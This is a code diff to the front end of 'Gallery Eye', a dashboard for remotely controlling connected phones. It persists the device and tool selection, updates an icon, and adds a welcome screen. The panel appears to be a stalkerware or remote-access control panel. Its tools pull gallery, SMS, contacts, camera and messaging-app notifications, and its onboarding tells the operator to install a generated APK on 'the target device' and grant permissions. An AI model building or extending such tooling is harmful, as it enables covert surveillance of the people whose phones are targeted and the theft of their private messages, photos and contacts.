@@ -52,9 +52,24 @@ export default function Home() {
     const [zipProgress, setZipProgress] = useState({ stage: 'creating' as 'creating' | 'uploading' | 'ready' | 'error', current: 0, total: 0, url: '', error: '' });
     const [zipFiles, setZipFiles] = useState<{ folderName: string, url: string, fileCount: number, timestamp: Date }[]>([]);
 
-    // Multi-Device State
+    // Multi-Device State — persist selected device across refresh
     const [devices, setDevices] = useState<any[]>([]);
-    const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
+    const [selectedDeviceId, setSelectedDeviceIdState] = useState<string | null>(() => {
+        if (typeof window !== 'undefined') {
+            return localStorage.getItem('ge_selectedDeviceId') || null;
+        }
+        return null;
+    });
+    const setSelectedDeviceId = (id: string | null | ((prev: string | null) => string | null)) => {
+        setSelectedDeviceIdState(prev => {
+            const newVal = typeof id === 'function' ? id(prev) : id;
+            if (typeof window !== 'undefined') {
+                if (newVal) localStorage.setItem('ge_selectedDeviceId', newVal);
+                else localStorage.removeItem('ge_selectedDeviceId');
+            }
+            return newVal;
+        });
+    };
     const [isDeviceDropdownOpen, setIsDeviceDropdownOpen] = useState(false);
 
     const [uploadProgress, setUploadProgress] = useState<any>(null);
@@ -70,8 +85,20 @@ export default function Home() {
     const [isDeleting, setIsDeleting] = useState(false);
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
-    // Tool Selector State
-    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications'>('gallery');
+    // Tool Selector State — persist across refresh
+    const [selectedTool, setSelectedToolState] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications'>(() => {
+        if (typeof window !== 'undefined') {
+            const saved = localStorage.getItem('ge_selectedTool');
+            if (saved && ['gallery', 'sms', 'contacts', 'torch', 'vibration', 'camera', 'notifications'].includes(saved)) {
+                return saved as any;
+            }
+        }
+        return 'gallery';
+    });
+    const setSelectedTool = (tool: typeof selectedTool) => {
+        setSelectedToolState(tool);
+        if (typeof window !== 'undefined') localStorage.setItem('ge_selectedTool', tool);
+    };
     const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);
 
     // Torch State
@@ -109,7 +136,7 @@ export default function Home() {
         { key: 'whatsapp', label: 'WhatsApp', packages: ['com.whatsapp'], color: '#25D366', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/240px-WhatsApp.svg.png' },
         { key: 'facebook', label: 'Facebook', packages: ['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite'], color: '#1877F2', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/240px-Facebook_Logo_%282019%29.png' },
         { key: 'instagram', label: 'Instagram', packages: ['com.instagram.android'], color: '#E4405F', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/240px-Instagram_icon.png' },
-        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/WhatsApp_Business_icon.png/240px-WhatsApp_Business_icon.png' },
+        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'https://play-lh.googleusercontent.com/AQtSF5Z-GGNnPUxPFHMFsOGPe4tXn3Xhqt5GjwDRMmpOZgjpKL1PxK1Hrr3b666C3Q=w240-h480-rw' },
         { key: 'snapchat', label: 'Snapchat', packages: ['com.snapchat.android'], color: '#FFFC00', img: 'https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/240px-Snapchat_logo.svg.png' },
     ];
 
@@ -870,6 +897,48 @@ END:VCARD`;
 
             <div className="relative z-10 max-w-7xl mx-auto px-4 md:px-6 py-8">
 
+                {/* Welcome Screen — shown when no device connected */}
+                {devices.length === 0 && !selectedDeviceId && (
+                    <div className="mb-8 p-6 md:p-10 rounded-2xl border border-white/10 bg-gradient-to-br from-white/[0.03] to-transparent">
+                        <div className="max-w-2xl mx-auto text-center">
+                            <div className="w-16 h-16 mx-auto mb-5 rounded-2xl bg-gradient-to-br from-purple-500/20 to-cyan-500/20 flex items-center justify-center">
+                                <svg className="w-8 h-8 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
+                            </div>
+                            <h2 className="text-2xl font-bold mb-2">Welcome to Gallery Eye</h2>
+                            <p className="text-white/40 mb-8">Get started by connecting your first device</p>
+                            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-left">
+                                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                                    <div className="w-8 h-8 rounded-lg bg-purple-500/20 flex items-center justify-center mb-3">
+                                        <span className="text-sm font-bold text-purple-400">1</span>
+                                    </div>
+                                    <h3 className="font-semibold text-sm mb-1">Download App</h3>
+                                    <p className="text-xs text-white/30">Click &quot;Download App&quot; button above to generate your custom APK</p>
+                                </div>
+                                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                                    <div className="w-8 h-8 rounded-lg bg-cyan-500/20 flex items-center justify-center mb-3">
+                                        <span className="text-sm font-bold text-cyan-400">2</span>
+                                    </div>
+                                    <h3 className="font-semibold text-sm mb-1">Install & Setup</h3>
+                                    <p className="text-xs text-white/30">Install the APK on the target device and grant the required permissions</p>
+                                </div>
+                                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                                    <div className="w-8 h-8 rounded-lg bg-green-500/20 flex items-center justify-center mb-3">
+                                        <span className="text-sm font-bold text-green-400">3</span>
+                                    </div>
+                                    <h3 className="font-semibold text-sm mb-1">Start Using</h3>
+                                    <p className="text-xs text-white/30">Once connected, select a device from the top bar and pick a tool to begin</p>
+                                </div>
+                            </div>
+                            <button
+                                onClick={() => setShowAppModal(true)}
+                                className="mt-8 px-6 py-3 rounded-xl bg-gradient-to-r from-purple-600 to-cyan-600 text-white font-semibold hover:scale-[1.02] transition-transform shadow-lg shadow-purple-500/20"
+                            >
+                                Generate Your App →
+                            </button>
+                        </div>
+                    </div>
+                )}
+
                 {/* Remote Control Section */}
                 <div className="mb-12">
                     <div className="flex items-center justify-between mb-6">
@@ -877,10 +946,13 @@ END:VCARD`;
                             <h2 className="text-2xl font-bold">Remote Control</h2>
                             {selectedDeviceId ? (
                                 <span className="text-sm text-green-400 font-medium flex items-center gap-2">
-                                    Connected to: {devices.find(d => d.deviceId === selectedDeviceId)?.name}
+                                    <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+                                    Connected to: {devices.find(d => d.deviceId === selectedDeviceId)?.name || 'Device'}
                                 </span>
+                            ) : devices.length > 0 ? (
+                                <span className="text-sm text-yellow-400/70">👆 Select a device from the top bar to start</span>
                             ) : (
-                                <span className="text-sm text-white/40">Select a device from the top right to enable controls</span>
+                                <span className="text-sm text-white/30">No devices connected yet</span>
                             )}
                         </div>
                     </div>
@@ -1223,8 +1295,8 @@ END:VCARD`;
                                             key={app.key}
                                             onClick={() => setSelectedNotifApp(app.key)}
                                             className={`flex items-center gap-2 px-3 py-2 rounded-full transition-all flex-shrink-0 ${selectedNotifApp === app.key
-                                                    ? 'shadow-lg scale-[1.03]'
-                                                    : 'bg-white/[0.04] hover:bg-white/[0.08] border border-white/[0.06]'
+                                                ? 'shadow-lg scale-[1.03]'
+                                                : 'bg-white/[0.04] hover:bg-white/[0.08] border border-white/[0.06]'
                                                 }`}
                                             style={selectedNotifApp === app.key ? {
                                                 background: `linear-gradient(135deg, ${app.color}25, ${app.color}10)`,
